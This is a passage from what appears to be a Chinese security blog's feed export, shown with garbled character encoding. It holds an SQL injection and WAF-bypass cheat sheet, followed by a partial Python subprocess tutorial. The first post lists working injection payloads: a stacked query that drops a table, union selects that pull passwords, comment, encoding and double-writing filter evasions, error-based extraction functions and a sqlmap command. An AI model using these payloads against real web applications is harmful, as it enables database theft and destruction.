ï¼Ÿ</strong></h3><p>Webåº”ç”¨æœªå¯¹ç”¨æˆ·æä¾›çš„æ•°æ®è¿›è¡Œå……åˆ†å®¡æŸ¥å’Œæœªå¯¹è¾“å‡ºè¿›è¡Œç¼–ç æ˜¯äº§ç”Ÿé—®é¢˜çš„ä¸»è¦åŸå› ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯å †å æŸ¥è¯¢ï¼ˆstacked-queryï¼‰ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å †å æŸ¥è¯¢ï¼ˆstacked-queryï¼‰ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å †å æŸ¥è¯¢ï¼ˆstacked queryï¼‰ï¼Ÿ"></a><strong>ä»€ä¹ˆæ˜¯å †å æŸ¥è¯¢ï¼ˆstacked queryï¼‰ï¼Ÿ</strong></h3><p>åœ¨å•ä¸ªæ•°æ®åº“è¿æ¥ä¸­ï¼Œæ‰§è¡Œå¤šä¸ªæŸ¥è¯¢åºåˆ—ï¼Œæ˜¯å¦å…è®¸å †å æŸ¥è¯¢æ˜¯å½±å“èƒ½å¦åˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„é‡è¦å› ç´ ä¹‹ä¸€ã€‚</p><p>åœ¨MYSQLä¸­ï¼Œ<code>SELECT * FROM members; DROP members;</code>æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œæ•°æ®åº“æ˜¯è‚¯å®šæ”¯æŒå †å æŸ¥è¯¢çš„ï¼Œä½†æ˜¯è®©phpæ¥æ‰§è¡Œå †å æŸ¥è¯¢çš„sqlè¯­å¥å°±ä¸ä¸€å®šè¡Œäº†ã€‚</p><h3 id="æ˜¯å•¥æ„æ€ï¼Ÿ"><a href="#æ˜¯å•¥æ„æ€ï¼Ÿ" class="headerlink" title="**/*! ... */**æ˜¯å•¥æ„æ€ï¼Ÿ"></a>**<code>/*! ... */</code>**<strong>æ˜¯å•¥æ„æ€ï¼Ÿ</strong></h3><p>MYSQLæ•°æ®åº“ç‰¹æœ‰ï¼Œå¦‚æœåœ¨æ³¨é‡Šçš„å¼€å¤´éƒ¨åˆ†æ·»åŠ ä¸€ä¸ªæ„Ÿå¹å·å¹¶åœ¨åé¢è·Ÿä¸Šæ•°æ®åº“ç‰ˆæœ¬ç¼–å·ï¼Œé‚£ä¹ˆè¯¥æ³¨é‡Šå°†è¢«è§£ææˆä»£ç ï¼Œåªè¦æ•°æ®åº“ç‰ˆæœ¬é«˜äºæˆ–è€…ç­‰äºæ³¨é‡Šä¸­åŒ…å«çš„ç‰ˆæœ¬ï¼Œä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p><p><code>select 1 /!40119 + 1/</code></p><p>è¯¥æŸ¥è¯¢ç»“æœï¼š</p><blockquote><p>è¿”å›2(MySQLç‰ˆæœ¬ä¸º4.01.19æˆ–è€…æ›´é«˜)</p><p>è¿”å›1ï¼ˆå…¶ä»–æƒ…å†µï¼‰</p></blockquote><h3 id="å¦‚æœæ³¨å…¥è¯­å¥ä¸­çš„â€˜-â€™è¢«è¿‡æ»¤ï¼Ÿ"><a href="#å¦‚æœæ³¨å…¥è¯­å¥ä¸­çš„â€˜-â€™è¢«è¿‡æ»¤ï¼Ÿ" class="headerlink" title="å¦‚æœæ³¨å…¥è¯­å¥ä¸­çš„â€˜=â€™è¢«è¿‡æ»¤ï¼Ÿ"></a><strong>å¦‚æœæ³¨å…¥è¯­å¥ä¸­çš„â€˜=â€™è¢«è¿‡æ»¤ï¼Ÿ</strong></h3><p>å¯ä»¥è€ƒè™‘ä½¿ç”¨likeå…³é”®å­—æ›¿æ¢ï¼š<code>union select password from users where username like adminï¼›</code></p><h3 id="å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨â€˜-â€™æ›¿æ¢ï¼š"><a href="#å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨â€˜-â€™æ›¿æ¢ï¼š" class="headerlink" title="å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨â€˜/**/â€™æ›¿æ¢ï¼š"></a><strong>å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨â€˜/**/â€™æ›¿æ¢ï¼š</strong></h3><p><code>union/**/select/**/password/**/from/**/users/**/where/**/username/**/like/**/adminï¼›</code></p><p>æ³¨æ„ï¼Œå¦‚æœè¿‡æ»¤äº†å…³é”®å­—ï¼Œåœ¨MySQLä¸­ï¼Œè¿˜å¯ä»¥åœ¨å…³é”®å­—å†…éƒ¨ä½¿ç”¨å†…è”æ³¨é‡Šæ¥ç»•è¿‡ï¼š</p><p><code>uni//on//sel//ect//password//fr//om//users//wh//ere//username//like//adminï¼›</code></p><h3 id="SQLæ³¨å…¥ä¸­çš„â€˜-â€™ï¼Ÿ"><a href="#SQLæ³¨å…¥ä¸­çš„â€˜-â€™ï¼Ÿ" class="headerlink" title="SQLæ³¨å…¥ä¸­çš„â€˜+â€™ï¼Ÿ"></a><strong>SQLæ³¨å…¥ä¸­çš„â€˜+â€™ï¼Ÿ</strong></h3><p>MSSQLï¼šåœ¨MSSQLä¸­ï¼Œâ€œ+â€è¿ç®—ç¬¦è¢«ç”¨äºå­—ç¬¦ä¸²è¿æ¥å’ŒåŠ æ³•è¿ç®—ï¼Œâ€˜1â€™+â€˜1â€™=â€˜11â€™ï¼Œ1+1=2ï¼›</p><p>MySQLï¼šåœ¨MySQLä¸­ï¼Œâ€œ+â€è¿ç®—ç¬¦åªè¢«ç”¨äºåŠ æ³•è¿ç®—ï¼Œâ€˜1â€™+â€˜1â€™=â€˜2â€™ï¼Œ1+1=2ï¼›</p><p>Oracleï¼šåœ¨Oracleä¸­ï¼Œâ€œ+â€è¿ç®—ç¬¦åªè¢«ç”¨äºåŠ æ³•è¿ç®—ï¼Œâ€˜1â€™+â€˜1â€™=â€˜2â€™ï¼Œ1+1=2ã€‚</p><h3 id="æ•°æ®åº“ä¸­å­—ç¬¦ä¸²çš„è¿æ¥ç¬¦ï¼Ÿ"><a href="#æ•°æ®åº“ä¸­å­—ç¬¦ä¸²çš„è¿æ¥ç¬¦ï¼Ÿ" class="headerlink" title="æ•°æ®åº“ä¸­å­—ç¬¦ä¸²çš„è¿æ¥ç¬¦ï¼Ÿ"></a><strong>æ•°æ®åº“ä¸­å­—ç¬¦ä¸²çš„è¿æ¥ç¬¦ï¼Ÿ</strong></h3><p>MSSQLï¼šâ€˜aâ€™+â€˜bâ€™=â€˜abâ€™</p><p>MYSQLï¼šâ€˜aâ€™ â€˜bâ€™=â€˜abâ€™</p><p>Oracleï¼šâ€˜aâ€™||â€˜bâ€™=â€˜abâ€™</p><h3 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a><strong>æ³¨é‡Šç¬¦</strong></h3><p>MSSQLï¼šâ€˜â€“ â€™(æ³¨æ„åé¢çš„ç©ºæ ¼)ï¼Œâ€˜<code>/.../</code>â€™</p><p>MySQLï¼šâ€˜â€“ â€™,â€˜# â€™,â€˜<code>/.../</code>â€™ï¼Œæ³¨æ„ï¼Œâ€“åé¢å¿…é¡»è¦æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªç©ºæ ¼ã€‚</p><p>Oracleï¼šâ€˜â€“ â€™,â€˜<code>/.../</code>â€™</p><p>ä¸‰ç§æ•°æ®åº“ä¸­ï¼Œé€šç”¨çš„æ³¨é‡Šç¬¦æ˜¯â€˜â€“ â€™</p><h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a><strong>WAFç»•è¿‡</strong></h2><h3 id="è§„åˆ™å±‚é¢çš„ç»•è¿‡"><a href="#è§„åˆ™å±‚é¢çš„ç»•è¿‡" class="headerlink" title="è§„åˆ™å±‚é¢çš„ç»•è¿‡"></a>è§„åˆ™å±‚é¢çš„ç»•è¿‡</h3><h4 id="SQLæ³¨é‡Šç¬¦ç»•è¿‡"><a href="#SQLæ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="SQLæ³¨é‡Šç¬¦ç»•è¿‡"></a><strong>SQLæ³¨é‡Šç¬¦ç»•è¿‡</strong></h4><p><code>union/**/select</code></p><p><code>union/aaaa%01bbs/select</code></p><p><code>union/aaaaaaaaaaaaaaaaaaaaaaaaaaaa/select</code></p><p>å†…è¿æ³¨é‡Šï¼š<code>/!xxxx/</code></p><h4 id="ç©ºç™½ç¬¦å·ç»•è¿‡ï¼š"><a href="#ç©ºç™½ç¬¦å·ç»•è¿‡ï¼š" class="headerlink" title="ç©ºç™½ç¬¦å·ç»•è¿‡ï¼š"></a><strong>ç©ºç™½ç¬¦å·ç»•è¿‡ï¼š</strong></h4><p>MySQLç©ºç™½ç¬¦ï¼š%90,%0A,%0B,%0D,%20,%0C,%A0,/xxx/</p><p>æ­£åˆ™çš„ç©ºç™½ç¬¦ï¼š%09,%0A,%0B,%0D,%20</p><p>Example-1ï¼šunion%250Cselect</p><p>Example-1ï¼šunion%25A0select</p><h4 id="å‡½æ•°åˆ†éš”ç¬¦å·ï¼š"><a href="#å‡½æ•°åˆ†éš”ç¬¦å·ï¼š" class="headerlink" title="å‡½æ•°åˆ†éš”ç¬¦å·ï¼š"></a><strong>å‡½æ•°åˆ†éš”ç¬¦å·ï¼š</strong></h4><p>concat%2520(</p><p>concat/**/(</p><p>concat%250c(</p><p>concat%25a0(</p><h4 id="æµ®ç‚¹æ•°è¯æ³•åˆ†æï¼š"><a href="#æµ®ç‚¹æ•°è¯æ³•åˆ†æï¼š" class="headerlink" title="æµ®ç‚¹æ•°è¯æ³•åˆ†æï¼š"></a><strong>æµ®ç‚¹æ•°è¯æ³•åˆ†æï¼š</strong></h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8E0</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span></span><span class="line"><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span></span><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8.0</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span></span><span class="line"><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span></span><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>\Nunion <span class="hljs-keyword">select</span></span><span class="line"><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="åˆ©ç”¨error-basedè¿›è¡ŒSQLæ³¨å…¥"><a href="#åˆ©ç”¨error-basedè¿›è¡ŒSQLæ³¨å…¥" class="headerlink" title="åˆ©ç”¨error_basedè¿›è¡ŒSQLæ³¨å…¥:"></a><strong>åˆ©ç”¨error_basedè¿›è¡ŒSQLæ³¨å…¥:</strong></h4><p>Error-based SQLæ³¨å…¥å‡½æ•°éå¸¸å®¹æ˜“è¢«å¿½ç•¥</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,md5(<span class="hljs-number">3</span>)));</span><span class="line"></br></span><span class="line">updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5d</span>,md5(<span class="hljs-number">3</span>)),<span class="hljs-number">1</span>);</span><span class="line"></br></span><span class="line">GeometryCollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span></span><span class="line"></br></span><span class="line">(<span class="hljs-keyword">select</span>@<span class="hljs-variable">@version</span>)f)x))</span><span class="line"></br></span><span class="line">polygon((<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">1</span>))x))</span><span class="line"></br></span><span class="line">linestring()</span><span class="line"></br></span><span class="line">multipoint()</span><span class="line"></br></span><span class="line">multilinestring()</span><span class="line"></br></span><span class="line">multipolygon()</span></code></pre></div></div><h4 id="MySQLç‰¹æ®Šè¯­æ³•"><a href="#MySQLç‰¹æ®Šè¯­æ³•" class="headerlink" title="MySQLç‰¹æ®Šè¯­æ³•"></a><strong>MySQLç‰¹æ®Šè¯­æ³•</strong></h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span>&#123;x table_name&#125;<span class="hljs-keyword">from</span>&#123;x information_schema.tables&#125;;</span></code></pre></div></div><h4 id="æ¯ä¸€ä¸ªç‚¹éƒ½èƒ½æ‰¾åˆ°ç»•è¿‡çš„æ–¹æ³•"><a href="#æ¯ä¸€ä¸ªç‚¹éƒ½èƒ½æ‰¾åˆ°ç»•è¿‡çš„æ–¹æ³•" class="headerlink" title="æ¯ä¸€ä¸ªç‚¹éƒ½èƒ½æ‰¾åˆ°ç»•è¿‡çš„æ–¹æ³•"></a><strong>æ¯ä¸€ä¸ªç‚¹éƒ½èƒ½æ‰¾åˆ°ç»•è¿‡çš„æ–¹æ³•</strong></h4><p>ä»¥æ³¨é‡Šç»•è¿‡ä¸ºä¾‹å­ï¼Œå¼€å§‹Fuzz</p><p>æ³¨é‡Šç¬¦ç»•è¿‡:</p><ul><li><p>å…ˆæµ‹è¯•æœ€åŸºæœ¬çš„: <code>union/**/select</code></p></li><li><p>å†æµ‹è¯•ä¸­é—´å¼•å…¥ç‰¹æ®Šå­—ï¼š<code>union/aaaa%01bbs/select</code></p></li><li><p>æœ€åæµ‹è¯•æ³¨é‡Šé•¿åº¦ï¼š<code>union/aaaaaaaaaaaaaaaaaaaaaaa/select</code></p></li></ul><p>æœ€åŸºæœ¬çš„æ¨¡å¼ï¼š</p><p><code>union/something/select</code></p><h4 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a><strong>å¤§å°å†™ç»•è¿‡</strong></h4><p>å¦‚æœç¨‹åºä¸­è®¾ç½®äº†è¿‡æ»¤å…³é”®å­—ï¼Œä½†æ˜¯è¿‡æ»¤è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰å¯¹å…³é”®å­—ç»„æˆè¿›è¡Œæ·±å…¥åˆ†æè¿‡æ»¤ï¼Œå¯¼è‡´åªå¯¹æ•´ä½“è¿›è¡Œè¿‡æ»¤ã€‚</p><p>ä¾‹å¦‚ï¼šandè¿‡æ»¤ã€‚å½“ç„¶è¿™ç§è¿‡æ»¤åªæ˜¯å‘ç°å…³é”®å­—å‡ºç°ï¼Œå¹¶ä¸ä¼šå¯¹å…³é”®å­—å¤„ç†ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹å…³é”®å­—çš„å†…å­—æ¯å¤§å°å†™æ¥ç»•è¿‡è¿‡æ»¤æªæ–½ã€‚</p><h3 id="å¸¸è§„ç»•è¿‡æ‰‹æ®µ"><a href="#å¸¸è§„ç»•è¿‡æ‰‹æ®µ" class="headerlink" title="å¸¸è§„ç»•è¿‡æ‰‹æ®µ"></a><strong>å¸¸è§„ç»•è¿‡æ‰‹æ®µ</strong></h3><h4 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a><strong>åŒå†™ç»•è¿‡</strong></h4><p>å¦‚æœåœ¨ç¨‹åºä¸­è®¾ç½®å‡ºç°å…³é”®å­—ä¹‹åæ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆSQlæ³¨å…¥æ”»å‡»ä¹Ÿä¸ä¼šå‘ç”Ÿã€‚å¯¹äºè¿™æ ·çš„è¿‡æ»¤ç­–ç•¥å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ã€‚å› ä¸ºåœ¨è¿‡æ»¤è¿‡ç¨‹ä¸­åªè¿›è¡Œäº†ä¸€æ¬¡æ›¿æ¢ã€‚</p><p>ä¾‹å¦‚ï¼šè¿‡æ»¤äº†union åªè¦å‘ç°union æ— è®ºå¤§å°å†™éƒ½ä¼šè¢«æ›¿æ¢ä¸ºç©ºã€‚è¿™æ˜¯å°±å¯ä»¥é€šè¿‡åŒå†™uniuniononçš„å†™æ³•æ¥å¯¹è¿‡æ»¤è¿›è¡Œç»•è¿‡ã€‚</p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a><strong>ç¼–ç ç»•è¿‡</strong></h4><p>å¯ä»¥åˆ©ç”¨ç½‘ç»œä¸­çš„URlåœ¨çº¿ç¼–ç ï¼Œç»•è¿‡SQLæ³¨å…¥çš„è¿‡æ»¤æœºåˆ¶ã€‚</p><p><a href="http://tool.chinaz.com/Tools/urlencode.aspx">http://tool.chinaz.com/Tools/urlencode.aspx</a> </p><h4 id="å†…è”æ³¨é‡Šç»•è¿‡"><a href="#å†…è”æ³¨é‡Šç»•è¿‡" class="headerlink" title="å†…è”æ³¨é‡Šç»•è¿‡"></a><strong>å†…è”æ³¨é‡Šç»•è¿‡</strong></h4><p>åœ¨Mysqlä¸­å†…å®¹æ³¨é‡Šä¸­çš„å†…å®¹å¯ä»¥è¢«å½“åšSQLè¯­å¥æ‰§è¡Œã€‚</p><h4 id="ç»•è¿‡è¿‡æ»¤andå’Œorçš„SQLæ³¨å…¥"><a href="#ç»•è¿‡è¿‡æ»¤andå’Œorçš„SQLæ³¨å…¥" class="headerlink" title="ç»•è¿‡è¿‡æ»¤andå’Œorçš„SQLæ³¨å…¥"></a><strong>ç»•è¿‡è¿‡æ»¤andå’Œorçš„SQLæ³¨å…¥</strong></h4><p>Mysqlä¸€äº›ç‰¹æ€§ï¼š</p><ol><li><p>Mysqlä¸­çš„å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¤§å†™å’Œå°å†™ä¸€æ ·ã€‚</p></li><li><p>Mysqlä¸­çš„åå…­è¿›åˆ¶ä¸URLç¼–ç ã€‚</p></li><li><p>ç¬¦å·å’Œå…³é”®å­—æ›¿æ¢ and â€“&gt; &amp;&amp;ã€or â€“&gt; ||</p></li><li><p>å†…è”æ³¨é‡Šä¸å¤šè¡Œæ³¨é‡Š /!å†…è”æ³¨é‡Š/ /å¤šè¡Œæ³¨é‡Š/ã€‚</p></li><li><p>Mysqlä¸­ä¼šè‡ªåŠ¨è¯†åˆ«URLä¸Hexç¼–ç å¥½çš„å†…å®¹ã€‚</p></li></ol><p><strong>ç»•è¿‡ç­–ç•¥ï¼š</strong></p><ol><li><p>å¤§å°å†™å˜å½¢ï¼Œor,OR,oR,Or,and,And,AND,aNDç­‰ã€‚</p></li><li><p>åœ¨è¿™ä¸¤ä¸ªæ•æ„Ÿè¯æ±‡ä¸­æ·»åŠ æ³¨é‡Šï¼Œä¾‹å¦‚ï¼š<code>a/**/and</code> åŒå†™ï¼š<code>oorr</code></p></li><li><p>åˆ©ç”¨ç¬¦å·æ›¿ä»£ andâ€“&gt;&amp;&amp;ã€orâ€“&gt;||</p></li></ol><h4 id="ç»•è¿‡å»é™¤ç©ºæ ¼çš„SQLæ³¨å…¥"><a href="#ç»•è¿‡å»é™¤ç©ºæ ¼çš„SQLæ³¨å…¥" class="headerlink" title="ç»•è¿‡å»é™¤ç©ºæ ¼çš„SQLæ³¨å…¥"></a><strong>ç»•è¿‡å»é™¤ç©ºæ ¼çš„SQLæ³¨å…¥</strong></h4><p>ç¼–ç ï¼šhex,urlencode</p><p>ç©ºæ ¼URLç¼–ç ï¼š</p><p>%0a æ–°å»ºä¸€è¡Œ</p><p>%0c æ–°çš„ä¸€é¡µ</p><p>%0d returnåŠŸèƒ½</p><p>%0b TABé”®ï¼ˆå‚ç›´ï¼‰</p><p>Sqlmapå®‰å…¨æ£€æµ‹ï¼š</p><p>sqlmap -u â€œURLâ€ â€“hex â€“dbs â€“batch</p><h4 id="ç»•è¿‡å»é™¤ï¼ˆunionå’Œselectï¼‰çš„SQLæ³¨å…¥"><a href="#ç»•è¿‡å»é™¤ï¼ˆunionå’Œselectï¼‰çš„SQLæ³¨å…¥" class="headerlink" title="ç»•è¿‡å»é™¤ï¼ˆunionå’Œselectï¼‰çš„SQLæ³¨å…¥"></a><strong>ç»•è¿‡å»é™¤ï¼ˆunionå’Œselectï¼‰çš„SQLæ³¨å…¥</strong></h4><p>ç¼–ç <code>%0a</code>ã€åŠ å…¥<code>/**/</code>ç¬¦ï¼Œunion/selectå¤§å°å†™ã€åŒå†™ç­‰ç»•è¿‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python è°ƒç”¨æ‰§è¡ŒShellå‘½ä»¤</title>
      <link href="/2022/02/10/Python-%E8%B0%83%E7%94%A8%E6%89%A7%E8%A1%8CShell%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/02/10/Python-%E8%B0%83%E7%94%A8%E6%89%A7%E8%A1%8CShell%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="os-system"><a href="#os-system" class="headerlink" title="os.system"></a>os.system</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">os.system(cmd)</span></code></pre></div></div><p>å¯ä»¥ç›´æ¥ä½¿ç”¨Shellå‘½ä»¤ï¼Œå¹¶å›æ˜¾ã€‚</p><h2 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h2><p><code>subprocess</code>æ¨¡å—å…è®¸å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œå¹¶è¿æ¥åˆ°è¾“å…¥/è¾“å‡º/é”™è¯¯ç®¡é“ï¼Œä»è€Œè·å–è¿”å›å€¼ã€‚</p><p>å¸¸ç”¨çš„æ–¹æ³•æœ‰</p><h3 id="run"><a href="#run" class="headerlink" title="run"></a><code>run</code></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line">subprocess.<span class="hljs-builtin-name">run</span>(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">input</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">capture_output</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">cwd</span>=None, <span class="hljs-attribute">timeout</span>=None, <span class="hljs-attribute">check</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">encoding</span>=None, <span class="hljs-attribute">errors</span>=None, <span class="hljs-attribute">text</span>=None, <span class="hljs-attribute">env</span>=None, <span class="hljs-attribute">universal_newlines</span>=None)</span></code></pre></div></div><table><thead><tr><th align="center">å‚æ•°</th><th align="center">æ³¨é‡Š</th></tr></thead><tbody><tr><td align="center"><code>args</code></td><td align="center">å¿…é¡»ä½¿ç”¨æ•°ç»„çš„æ–¹å¼ï¼Œæ‰€ä»¥ç»å¸¸ä½¿ç”¨<code>shlex.split()</code>æ¥åˆ‡å‰²å‘½ä»¤</td></tr><tr><td align="center"><code>stdin</code></td><td align="center">æ ‡å‡†è¾“å…¥</td></tr><tr><td align="center"><code>input</code></td><td align="center">ä½¿ç”¨<strong>å­—èŠ‚</strong>ä¼ é€’è¾“å…¥ï¼Œå¦‚æœtextä¸ºTrueåˆ™å¯ä»¥ä¸º<strong>å­—ç¬¦ä¸²</strong></td></tr><tr><td align="center"><code>stdout</code></td><td align="center">æ ‡å‡†è¾“å‡º</td></tr><tr><td align="center"><code>stderr</code></td><td align="center">æ ‡å‡†é”™è¯¯è¾“å‡º</td></tr><tr><td align="center"><code>capture_output</code></td><td align="center">æ˜¯å¦è·å–è¿”å›å€¼</td></tr><tr><td align="center"><code>shell</code></td><td align="center">æ‰§è¡ŒæŒ‡å®šçš„shellæŒ‡ä»¤, argså¯ä»¥ç›´æ¥ä¸ºå­—ç¬¦ä¸²</td></tr><tr><td align="center"><code>cwd</code></td><td align="center">æŒ‡å®šè¿è¡Œçš„ç›®å½•</td></tr><tr><td align="center"><code>timeout</code></td><td align="center">è¶…æ—¶åæ€æ­»å­è¿›ç¨‹å¹¶æŠ›å‡º <code>TimeoutExpired</code> å¼‚å¸¸</td></tr><tr><td align="center"><code>check</code></td><td align="center">è¿›ç¨‹ä»¥éé›¶ç é€€å‡ºæ—¶ï¼ŒæŠ›å‡º <code>CalledProcessError</code> å¼‚å¸¸</td></tr><tr><td align="center"><code>encoding</code></td><td align="center">æŒ‡å®šç¼–ç ï¼Œæ­¤æ—¶inputå¯ä»¥ä¸ºå­—ç¬¦ä¸²</td></tr><tr><td align="center"><code>errors</code></td><td align="center">è¾“å‡ºæ–‡æœ¬</td></tr><tr><td align="center"><code>text</code></td><td align="center">ä»¥ input å’Œ errors è¾“å‡ºæ–‡æœ¬</td></tr><tr><td align="center"><code>env</code></td><td align="center">dict ç±»å‹ï¼Œæä¾›ç¯å¢ƒå˜é‡</td></tr><tr><td align="center"><code>universal_newlines</code></td><td align="center">ç­‰åŒäº text å‚æ•°ï¼Œè¾“å‡ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™è¾“å‡ºå­—èŠ‚</td></tr></tbody></table><p>ä¾‹å¦‚ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.run(shlex.split(<span class="hljs-string">&quot;tmux new-session -s TireFire_&#123;&#125; -n Main -c &#123;&#125; -d&quot;</span>.<span class="hljs-built_in">format</span>(hostname, cwd)))</span></code></pre></div></div><p>æ­¤æ—¶åªæ˜¯å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹æ‰§è¡Œï¼Œå¹¶æ²¡æœ‰æ•è·è¾“å‡º</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.run(shell.split(<span class="hljs-string">&quot;ls -la&quot;</span>), capture_output=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span></code></pre></div></div><p>è¿™æ ·å°±å¯ä»¥å†è¿”å›å€¼é‡Œé¢è·å¾—<code>stdout</code>äº†</p><p>æ›´ç®€å•çš„æ–¹å¼æ˜¯ä½¿ç”¨<code>subprocess.getoutput</code></p><h3 id="getoutput"><a href="#getoutput" class="headerlink" title="getoutput"></a><code>getoutput</code></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.getoutput(cmd)</span></code></pre></div></div><p>ä¾‹å­:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">uid = subprocess.getoutput(<span class="hljs-string">&quot;id -u&quot;</span>)</span><span class="line"><span class="hljs-keyword">if</span> uid != <span class="hljs-string">&quot;0&quot;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;must be run with root permissions&quot;</span>)</span></code></pre></div></div><h3 id="Popen"><a href="#Popen" class="headerlink" title="Popen"></a><code>Popen</code></h3><p><code>subprocess.Popen</code>æ˜¯åŸºç¡€APIå‘½ä»¤ï¼Œå¯ä»¥æ§åˆ¶çš„åœ°æ–¹ä¹Ÿç›¸å¯¹å¤šä¸€äº›</p><p>å½“<code>stdin=subprocess.PIPE</code>çš„æ—¶å€™, å¯ä»¥é€šè¿‡<code>proc.stdout</code>è·å–å†…å®¹</p><p><code>proc.wait()</code>ç­‰å¾…è¿›ç¨‹ç»“æŸ</p><p>æ¯”å¦‚éœ€è¦åŒæ—¶è¾“å‡ºå±å¹•å’Œæ–‡ä»¶çš„æ—¶å€™</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> subprocess, sys</span><span class="line">proc = subprocess.Popen(shell,</span><span class="line">                        shell=<span class="hljs-literal">True</span>,</span><span class="line">                        stdout=subprocess.PIPE <span class="hljs-keyword">if</span> output <span class="hljs-keyword">else</span> <span 